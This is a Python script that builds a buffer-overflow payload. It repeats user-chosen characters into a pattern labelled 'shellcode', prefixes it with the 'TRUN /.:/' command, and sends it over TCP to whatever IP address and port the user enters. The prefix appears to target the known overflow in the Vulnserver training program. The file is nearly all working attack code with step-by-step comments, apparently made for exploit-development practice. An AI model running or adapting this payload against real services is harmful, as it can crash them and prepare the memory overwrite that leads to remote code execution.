#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: July 7th 2024
# Description of Script
# WIns_OvrWrte.py is a program that interacts with a network service by sending a custom payload
# to a specified target. It begins by prompting the user to input two characters and their 
# corresponding multipliers, which are used to construct a pattern called `shellcode`. 
# The script then asks for the target's IPv4 address and TCP port number. Using this 
# information, it creates a TCP socket connection to the target and sends the payload.
# If the connection attempt fails or if any input errors occur, appropriate error messages
# are displayed, and the script exits with a non-zero status to indicate failure. The script
# includes improved readability, specific exception handling, and detailed inline comments 
# to aid understanding.
#################################################################################################
import sys  # Importing the sys module for system-specific parameters and functions
import socket  # Importing the socket module for network connections

# Prompt the user to enter the first character
char1 = input("Enter the first character here: ")

# Prompt the user to enter the first multiplier and convert it to an integer
int1 = int(input("Enter the first multiplier here: "))

# Prompt the user to enter the second character
char2 = input("Enter the second character here: ")

# Prompt the user to enter the second multiplier and convert it to an integer
int2 = int(input("Enter the second multiplier here: "))

# Create the shellcode pattern by repeating the characters according to the multipliers
shellcode = char1 * int1 + char2 * int2

try:
    # Create a socket object with IPv4 addressing and TCP connection
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Ask the user to input the target IPv4 address and store it in the variable 'IPv4'
    IPv4 = input("Please enter the IPv4 address of the target: ")

    # Ask the user to input the target TCP port and convert it to an integer, then store it in the variable 'TCP'
    TCP = int(input("Please enter the TCP port of the target: "))

    # Attempt to connect to the target at the provided IPv4 address and TCP port
    soc.connect((IPv4, TCP))

    # Send a payload containing the pattern to the target
    payload = 'TRUN /.:/' + shellcode
    soc.send(payload.encode('utf-8'))

    # Close the socket connection
    soc.close()
except socket.error as e:
    # Print an error message if a socket error occurs and print the exception message
    print(f"Unable to establish connection with the host... womp womp\nError: {e}")

    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
except ValueError as e:
    # Print an error message if there is a value error (e.g., invalid port number) and print the exception message
    print(f"Invalid input... womp womp\nError: {e}")

    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
except Exception as e:
    # Print a general error message for any other exceptions and print the exception message
    print(f"An unexpected error occurred... womp womp\nError: {e}")

    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
